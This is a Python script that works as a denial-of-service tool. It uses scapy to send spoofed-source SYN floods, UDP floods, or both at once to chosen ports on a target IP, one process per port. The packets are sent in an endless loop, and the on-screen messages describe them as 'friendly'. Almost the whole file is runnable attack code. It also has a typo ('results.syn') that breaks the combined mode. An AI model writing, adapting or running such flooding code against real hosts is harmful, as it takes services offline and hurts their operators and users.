from scapy.all import *
from scapy.layers.inet import TCP, IP, UDP
from multiprocessing import Pool
import argparse


# creates syn packets to flood network
def send_syn(target_ip_address: str, target_port: int, size_of_packet: int):
    # spoofs source ip address
    spoof = target_ip_address + "/12"
    ip = IP(src=RandIP(spoof), dst=target_ip_address)
    # creates SYN packet, but doesn't finish the handshake
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"$" * size_of_packet)
    p = ip / tcp / raw
    print(f"sending friendly syn packets to port {target_port} press CTRL+C to stop")
    send(p, loop=1, verbose=0)


# creates udp packets to flood network
def send_udp(target_ip_address: str, target_port: int, size_of_packet: int):
    # spoofs source ip address
    spoof = target_ip_address + "/12"
    ip = IP(src=RandIP(spoof), dst=target_ip_address)
    # creates UDP packet
    udp = UDP(sport=RandShort(), dport=target_port)
    raw = Raw(b"?" * size_of_packet)
    p = ip / udp / raw
    print(f"sending friendly udp packets to port {target_port} press CTRL+C to stop")
    send(p, loop=1, verbose=0)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-m", "--attack_mode", type=int, help="1 for UDP, 2 for SYN, 3 for both")
    parser.add_argument("-i", "--ip",          type=str, help="target ip address")
    parser.add_argument("-p", "--ports",       type=int, nargs="+", help="series of ports separated by spaces")
    parser.add_argument("-s", "--packet_size", type=int, help="size of payload")
    args = parser.parse_args()

    if len(sys.argv) < 9:
        print(f"error, 4 arguments are required for attack {len(sys.argv)} given")
        exit(1)

    attack_mode = args.attack_mode
    ip = args.ip
    ports_to_attack = args.ports
    packet_size = args.packet_size

    # each port attacked corresponds to a process and
    # each process requires its own array of parameters to be used with multiprocessing
    args = [[0 for _ in range(3)] for _ in range(len(ports_to_attack))]
    for i in range(len(ports_to_attack)):
        args[i][0] = ip
        args[i][1] = int(ports_to_attack[i])
        args[i][2] = int(packet_size)

    # sends UDP flood if attack mode == 1
    if int(attack_mode) == 1:
        with Pool(len(ports_to_attack)) as pool:
            results = pool.starmap(send_udp, args)

    # sends SYN flood if attack mode == 2
    if int(attack_mode) == 2:
        with Pool(len(ports_to_attack)) as pool:
            results = pool.starmap(send_syn, args)

    # sends UDP and SYN flood simultaneously if attack mode == 3
    if int(attack_mode) == 3:
        with Pool(len(ports_to_attack) * 2) as pool:
            results_udp = pool.starmap_async(send_udp, args)
            results_syn = pool.starmap_async(send_syn, args)
            results_udp.get()
            results.syn.get()
